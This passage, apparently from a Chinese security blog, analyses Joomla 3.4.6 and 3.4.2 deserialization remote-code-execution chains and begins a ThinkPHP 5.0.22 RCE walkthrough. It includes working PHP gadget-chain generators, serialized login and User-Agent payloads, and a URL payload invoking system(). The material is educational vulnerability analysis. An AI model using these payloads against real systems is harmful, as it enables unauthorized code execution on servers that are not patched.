cjk_fallback">两</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">都</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span></span></span></span> this-&gt;cache 为 True，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>r</mi><mi>a</mi><msub><mi>w</mi><mi>d</mi></msub><mi>a</mi><mi>t</mi><mi>a</mi><mtext>为</mtext><mi>T</mi><mi>r</mi><mi>u</mi><mi>e</mi><mtext>，</mtext></mrow><annotation encoding="application/x-tex">this-&gt;raw_data为True，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">u</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">，</span></span></span></span>parsed_feed_url [‘scheme’] 不为空就能够 RCE 了，并且 $parsed_feed_url [‘scheme’] 可以能够利用 || $a=‘http//’; 绕过 scheme 的解析</p>
<p>不过这个 call_user_func 属于 init () 方法，并不属于魔术方法，所以需要结合前面 JDatabaseDriverMysqli 类下的 disconnect () 中的 call_user_func_array 方法实现对 init () 方法的回调。就相当于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;disconnectHandlers = array(&quot;test&quot;=&gt;array(new SimplePie(),&quot;init&quot;));</span><br></pre></td></tr></table></figure>
<p>这样的话就相当于实例化了一个 SimplePie 类的对象，并且调用 SimplePie 类下的 init () 方法。</p>
<p>这里还有一个问题，虽然实例化了一个 SimplePie 的类，但是 SimplePie 类不会自动加载。需要去引入加载类。</p>
<p>/libraries/legacy/simplepie/factory.php</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031184225965-1491276190.png" alt="img"></p>
<p>发现刚开始就导入了 SimplePie 类，并且 JSimplepieFactory 类属于 autoload，会自动加载，这样的话只需要引入这个类就可以成功加载 SimplePie。</p>
<p>payload 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class JSimplepieFactory&#123;&#125;</span><br><span class="line">class JDatabaseDriverMysql&#123;&#125;</span><br><span class="line">class JDatabaseDriverMysqli</span><br><span class="line">&#123;</span><br><span class="line">    protected $abc;</span><br><span class="line">    protected $connection;</span><br><span class="line">    protected $disconnectHandlers;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;abc = new JSimplepieFactory();</span><br><span class="line">        $this-&gt;connection = 1;</span><br><span class="line">        $this-&gt;disconnectHandlers = [</span><br><span class="line">            [new SimplePie, &quot;init&quot;],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class SimplePie</span><br><span class="line">&#123;</span><br><span class="line">    var $sanitize;</span><br><span class="line">    var $cache_name_function;</span><br><span class="line">    var $feed_url;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;feed_url = &quot;phpinfo();JFactory::getConfig();exit;&quot;;</span><br><span class="line">        $this-&gt;cache_name_function = &quot;assert&quot;;</span><br><span class="line">        $this-&gt;sanitize = new JDatabaseDriverMysql();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new JDatabaseDriverMysqli();</span><br><span class="line">$ser = serialize($obj);</span><br><span class="line">echo str_replace(chr(0) . &#x27;*&#x27; . chr(0), &#x27;\0\0\0&#x27;, $ser);?&gt;</span><br></pre></td></tr></table></figure>
<p>最后构造的账号密码为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username：\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</span><br><span class="line">password：123&quot;;s:4:&quot;test&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:6:&quot;\0\0\0abc&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:3:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>登录时需要登录两次，第一次将他序列化存储进 session 中，第二次将 session 中的值反序列化和我们的输入进行比对，在第二次 rce 产生</p>
<blockquote>
<p>最后总结一下：</p>
<p>1.Joomla 中会把登录的用户名和密码序列化存储进入 session，并且放入数据库中。</p>
<p>2. 由于 username 和 password 是 protected，因此会有 <code>*N*</code>  的修饰，但数据库中不能存储 <code>N*N</code> （N 为 ASCII 为 0 的字符），因此在序列化入 session 中会将 <code>N*N</code>  替换为 <code>\0\0\0</code> ，在下次和我们输入的用户名密码判断时反序列化，将其变为合规的序列化字符串</p>
<p>3. 漏洞的关键点在于从 <code>\0\0\0</code>  变为 <code>N*N</code>  时字符变少了三个，我们可以利用变少的三个做变量逃逸，从而覆盖 password</p>
<p>4. 因此我们的输入用户名时可以自己构造 <code>\0</code> ，比如我们构造如下用户 <code>\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</code> ，这样反序列化后多出了 27 个字符把后面的 password 全部吃掉了 <code>s:8:s:&quot;username&quot;;s:54:&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;</code> ，password 被吃掉后我们就可以构造我们自己的 password，里面的内容为恶意代码，我们接下来要干的事情就是把我们序列化过的恶意代码放入因为逃逸而变为可控变量的 password 中</p>
<p>5. 然后我们需要找危险函数，来调用，我们在 <code>libraries\joomla\database\driver\mysqli.php</code>  中找到了 <code>disconnect()</code>  函数，其中调用了 <code>call_user_func_array</code> ，而 mysqli 类中的 <code>__destruct()</code>  会自动调用 <code>disconnect ()</code></p>
<p>6. 但是 <code>disconnect()</code>  函数中的 <code>call_user_func_array</code>  中的参数我们只能控制第一个参数 <code>$h</code> ，不能直接构造恶意代码</p>
<p>7. 我们在 <code>libraries\simplepie\simplepie.php</code>  中有一个 <code>init()</code>  函数，其中还可以找到一个危险函数 <code>call_user_func</code>  方法调用，并且好消息是他的两个参数 <code>cache_name_function</code>  和 <code>feed_url</code>  我们都可以控制</p>
<p>8. 但是 <code>init()</code>  不是魔法方法，不会自动调用，我们需要使用一些奇技淫巧调用。即使用刚刚的 <code>disconnect()</code>  函数自动调用 <code>init()</code></p>
<p>9. 接下来的问题就是我们如何用 <code>disconnect()</code>  中的一个可控参数完成对 <code>init()</code>  的调用。我们使用 <code>call_user_func_array(array(new SimplePie(),&quot;init&quot;))</code>  这样的形式来调用，array 中第一个是我们的类名，第二个是类函数名，而我们不需要 ``call_user_func_array ()` 中的第二个变量</p>
<p>10. 最后一个问题是 <code>libraries\simplepie\simplepie.php</code>  和 <code>libraries\joomla\database\driver\mysqli.php</code>  是两个不同的 <code>php</code>  文件，如果没有 <code>include()</code>  这类函数的情况下是无法使用隔壁 php 的类的。我们的解决方案是找到一个新的文件 <code>/libraries/legacy/simplepie/factory.php</code> ，其中 <code>jimport(simplepie.simplepie)</code> ，同时 <code>factory.php</code>  中的 <code>JSimplepieFactory</code>  是自动 <code>autoload</code> ，这样我们就能加载 <code>simplepie</code>  类</p>
<p>11. 由于 <code>session</code>  的存在，我们需要抓包，连续放包两次，第一次将 <code>session</code>  写入数据库中，第二次将我们的输入和数据库中反序列化的 <code>session</code>  比对，一旦反序列化，我们上面构造的恶意 <code>payload</code>  触发，实现 <code>rce</code></p>
</blockquote>
<h3 id="joomla-342截断反序列化"><a class="markdownIt-Anchor" href="#joomla-342截断反序列化">#</a> Joomla 3.4.2 截断反序列化</h3>
<p>这个漏洞和前一个 Joomla3.4.6 反序列化很像，利用了相同的危险函数 <code>libraries\simplepie\simplepie.php</code>  中的一个 <code>init()</code>  函数和 <code>libraries\joomla\database\driver\mysqli.php</code>  中的 <code>disconnect()</code>  函数，并且利用 <code>/libraries/legacy/simplepie/factory.php</code> ，其中 <code>jimport(simplepie.simplepie)</code>  自动加载</p>
<p>区别在于：</p>
<blockquote>
<p>joomla 也没有采用 php 自带的 session 处理机制，而是用多种方式（包括 database、memcache 等）自己编写了存储 session 的容器（storage）。</p>
<p>其存储格式为『键名 ＋ 竖线 ＋ 经过 serialize () 函数反序列处理的值』，其未正确处理多个竖线的情况。</p>
<p>那么，我们这里就可以通过注入一个 <code>|</code>  符号，将它前面的部分全部认为是 name，而 | 后面我就可以插入任意 serialize 字符串，构造反序列化漏洞了。</p>
</blockquote>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/thum-16e81451235948.jpg" alt="14501748976406.jpg"></p>
<p>但还有一个问题，在我们构造好的反序列化字符串后面，还有它原本的内容，必须要截断。而此处并不像 SQL 注入，还有注释符可用。</p>
<p>但不知各位是否还记得当年 wordpress 出过的一个 XSS ( <span class="exturl" data-url="aHR0cDovL3d3dy5sZWF2ZXNvbmdzLmNvbS9IVE1ML3dvcmRwcmVzcy00LTEtc3RvcmVkLXhzcy5odG1s">http://www.leavesongs.com/HTML/wordpress-4-1-stored-xss.html</span> )，当时就是在插入数据库的时候利用 &quot;𝌆&quot;（% F0%9D%8C%86）字符将 utf-8 的字段截断了。</p>
<p>这里我们用同样的方法，在 session 进入数据库的时候就截断后面的内容，避免对我们反序列化过程造成影响。</p>
<p>在 php5.6.13 以前的版本里，php 在获取 session 字符串以后，就开始查找第一个 |，然后用这个 | 将字符串分割成『键名』和『键值』。<br>
用 unserialize 解析键值，解析结果作为 session。</p>
<p>但如果这个 unserialize 解析失败，就放弃这次解析。找到下一个 |，再根据这个 | 将字符串分割成两部分，执行同样的操作，直到解析成功。</p>
<p>所以，这个 joomla 漏洞的核心内容就是：我们通过𝌆字符， 将原本的 session 截断了，结果因为长度不对所以第一次解析 | 失败，才轮到第二次解析我传入的 |，最后成功利用。</p>
<p>所以，构造 session 出错，是这个漏洞成立的核心。</p>
<p>我们可以用长字符（64k）串截断，来达成类似和𝌆字符截断一样的效果。</p>
<p>我们最终的 exp 为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//header(&quot;Content-Type: text/plain&quot;);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSimplepieFactory</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysql</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimplePie</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$sanitize</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cache_name_function</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$javascript</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$feed_url</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;feed_url = <span class="string">&quot;phpinfo();JFactory::getConfig();exit;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;javascript = <span class="number">9999</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cache_name_function = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sanitize = <span class="keyword">new</span> <span class="title class_">JDatabaseDriverMysql</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cache = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysqli</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$disconnectHandlers</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$connection</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title class_">JSimplepieFactory</span>();</span><br><span class="line">        <span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">SimplePie</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;connection = <span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;disconnectHandlers = [</span><br><span class="line">            [<span class="variable">$x</span>, <span class="string">&quot;init&quot;</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">JDatabaseDriverMysqli</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>); </span><br></pre></td></tr></table></figure>
<p><img data-src="https://www.leavesongs.com/content/uploadfile/201512/thum-46141451235941.jpg" alt="14501734764205.jpg"></p>
<p>将这个代码生成的 exp，以前面提到的注入『|』的变换方式，带入前面提到的 user-agent 中，即可触发代码执行。</p>
<p>其中，我们需要将 <code>char(0)*char(0)</code>  替换成 \0\0\0，因为在序列化的时候，protected 类型变量会被转换成 <code>\0*\0name</code>  的样式，这个替换在源代码中也可以看到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$result = str_replace(&#x27;\0\0\0&#x27;, chr(0) . &#x27;*&#x27; . chr(0), $result); </span><br></pre></td></tr></table></figure>
<p>给出我最终构造的 POC（既是上述 php 代码生成的 POC）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 123&#125;__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;ð</span><br><span class="line"></span><br><span class="line">//简单分析一下，123&#125;是为了将前一个解析失败的键值对闭合,__是他的命名规范,后面使我们的恶意代码</span><br></pre></td></tr></table></figure>
<p>我们再再再总结一下:</p>
<blockquote>
<p>1. 由于 Joomla 自定义 session 存储格式为『键名 ＋ 竖线 ＋ 经过 serialize () 函数反序列处理的值』，其未正确处理多个竖线的情况。而 php 5.6.13 以前在获取 session 字符串以后，就开始查找第一个 |，然后用这个 | 将字符串分割成『键名』和『键值』。用 unserialize 解析键值，解析结果作为 session。但如果这个 unserialize 解析失败，就放弃这次解析。找到下一个 |，再根据这个 | 将字符串分割成两部分，执行同样的操作，直到解析成功。</p>
<p>2. 我们利用（1）可以构造出我们自己的恶意代码的 payload，但是为什么要放在 User-agent 中捏？看图</p>
<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221115162408024.png" alt="image-20221115162408024" style="zoom: 50%;" />
<p>因为 libraries/joomla/session/session.php 中，_validate 函数，将 ua 和 xff 调用 set 方法设置到了 session 中（session.client.browser 和 session.client.forwarded），并且这两个参数使我们可控的</p>
<p>3. 为什么 exp 要按照上面的写捏，因为他除了截断和利用方式有所不同之外，触发函数都是相同滴</p>
<p>4. 那么有人又要问，那么后面多出来的 session 咋办捏，他原来 session 后面还有 cookie 等字段。但我们使用四字节截断了，后面的东西都没啦，就是上面的那坨 ð</p>
<p>5. 利用时我们仍需要进行两次发包，第一次不携带 cookie 和 User-agent，作用是将 cookie 存储进入数据库。第二次的 cookie 为第一个返回包中的 cookie，User-agent 为我们构造的恶意 payload，第二次发包时从数据库读取 session，造成 rce</p>
</blockquote>
<h3 id="thinkphp-5022-rce"><a class="markdownIt-Anchor" href="#thinkphp-5022-rce">#</a> Thinkphp 5.0.22 RCE</h3>
<p>这里将 Thinkphp5.0.22 解包之后可以看到如下目录结构：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201104235402918-1496995877.png" alt="img"></p>
<p>根据类的命名空间可以快速定位文件位置，在 ThinkPHP5.0 的规范里面，命名空间其实对应了文件的所在目录，app 命名空间通常代表了文件的起始目录为 application，而 think 命名空间则代表了文件的其实目录为 thinkphp/library/think，后面的命名空间则表示从起始目录开始的子目录，如下图所示：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201104235944649-946485747.png" alt="img"></p>
<p>Thinkphp 执行过程：</p>
<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120151418540.png" alt="image-20221120151418540" style="zoom:67%;" />
<p>在具体分析流程前传参方式，首先介绍一下模块等参数</p>
<ul>
<li>模块 : application\index，这个 index 就是一个模块，负责前台相关</li>
<li>控制器：在模块中的文件夹 controller，即为控制器，负责业务逻辑</li>
<li>操作：在控制器中定义的方法，比如在默认文件夹中 application\index\controller\Index.php 中就有两个方法，index 和 hello</li>
<li>参数：就是定义的操作需要传的参数</li>
</ul>
<p>在本文中会用到两种传参方式，其他的方式可以自行了解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. PATH_INFO模式 : http://127.0.0.1/public/index.php/模块/控制器/操作/(参数名)/(参数值)...</span><br><span class="line">2. 兼容模式 : http://127.0.0.1/public/index.php?s=/模块/控制器/操作&amp;(参数名)=(参数值)...</span><br></pre></td></tr></table></figure>
<p>如果直接访问入口文件 index.php 的话，由于 URL 中没有模块、控制器和操作，因此系统会访问默认模块（index）下面的默认控制器（Index）的默认操作（index），因此下面的访问是等效的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp_5.0.22/public/index.php</span><br><span class="line">http://127.0.0.1/thinkphp_5.0.22/public/index.php/index/index/index</span><br></pre></td></tr></table></figure>
<p>在 application\index\controller 目录下新建一个 Test.php，我们访问下面链接即可访问到 Test 控制器下的 hello 方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp_5.0.22/public/index.php/index/test/hello/name/bmjoker</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">http://127.0.0.1/thinkphp_5.0.22/public/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>
<p>程序入口 public/index.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// [ 应用入口文件 ]</span><br><span class="line">// 定义应用目录</span><br><span class="line">define(&#x27;APP_PATH&#x27;, __DIR__ . &#x27;/../application/&#x27;);</span><br><span class="line">// 加载框架引导文件</span><br><span class="line">require __DIR__ . &#x27;/../thinkphp/start.php&#x27;;</span><br></pre></td></tr></table></figure>
<p>public/start.php 会去调用 App 类的 run 方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think;</span><br><span class="line">// ThinkPHP 引导文件</span><br><span class="line">// 1. 加载基础文件</span><br><span class="line">require __DIR__ . &#x27;/base.php&#x27;;</span><br><span class="line">// 2. 执行应用</span><br><span class="line">App::run()-&gt;send();</span><br></pre></td></tr></table></figure>
<p>run () 有两个比较重要的方法：routeCheck () 方法和 exec () 方法</p>
<p>由于未设置调度信息，所以 $dispatch 为 null，进入 if 循环调用 routeCheck () 方法进行 URL 路由检测</p>
<p><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109231449360-339105155.png" alt="img"></p>
<p>跟进 routeCheck () 方法，看到最上面 $path 通过 path () 方法获取，值为 payload 中 s 后面的参数 &quot;index/think\app/invokefunction&quot;</p>
<p><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110000212836-250916839.png" alt="img"></p>
<p>这里可以尝试跟进一下 path () 方法：</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234256747-1493465291.png"><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234256747-1493465291.png" alt="img"></a></p>
<p>最后返回的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>p</mi><mi>a</mi><mi>t</mi><mi>h</mi><mtext>是</mtext></mrow><annotation encoding="application/x-tex">this-&gt;path是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord cjk_fallback">是</span></span></span></span> pathinfo 获取来的，$pathinfo 又是通过 pathinfo () 方法获取来的，跟进 pathinfo () 方法</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234406178-487044200.png"><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234406178-487044200.png" alt="img"></a></p>
<p>看到这里基本上就破案了，先判断通过 $_GET 方式传递过来的参数中有没有 s 传递过来的参数，如果有的话就获取，最后去掉两边的’ / ' 然后 return，也就是 &quot;index/think\app/invokefunction&quot;</p>
<p>继续往下走，可以看到有如下判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$must = !is_null(self::$routeMust) ? self::$routeMust : $config[&#x27;url_route_must&#x27;];</span><br></pre></td></tr></table></figure>
<p>如果开启了强制路由，那么输入的路由将报错导致后面导致程序无法运行，也就不存在 RCE 漏洞，但是默认是关闭的。</p>
<p>最后调用 Route::parseUrl ()</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110000726472-759985507.png"><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110000726472-759985507.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110001554366-91094100.png"><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110001554366-91094100.png" alt="img"></a></p>
<p>先通过 str_replace () 函数将url("index/think\app/invokefunction")中的' / '替换成' | '，然后调用parseUrlPath对 url 进行分割，会把 index/\think\app/invokefunction 以’ / ' 为分隔符，分成 [‘index’,‘think\app’,‘invokefunction’]。</p>
<p>根据 thinkphp 路由规则 index 为模块 、think\app 为控制器、invokefunction 为操作，最后封装成路由</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110002217354-1465544639.png"><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110002217354-1465544639.png" alt="img"></a></p>
<p>到这里为止 App::routeCheck () 方法才算走完</p>
<p>继续往下读 App.php 的代码，关键代码在 App::exec 中，因为返回值中为 module，因此进入黄色部分</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110003646394-1878424898.png"><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110003646394-1878424898.png" alt="img"></a></p>
<p>跟进 module 方法，黄色部分检测 module 是否存在，不存在则报错。<a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171434352-913856897.png"><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171434352-913856897.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171606416-1486045006.png"><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171606416-1486045006.png" alt="img"></a></p>
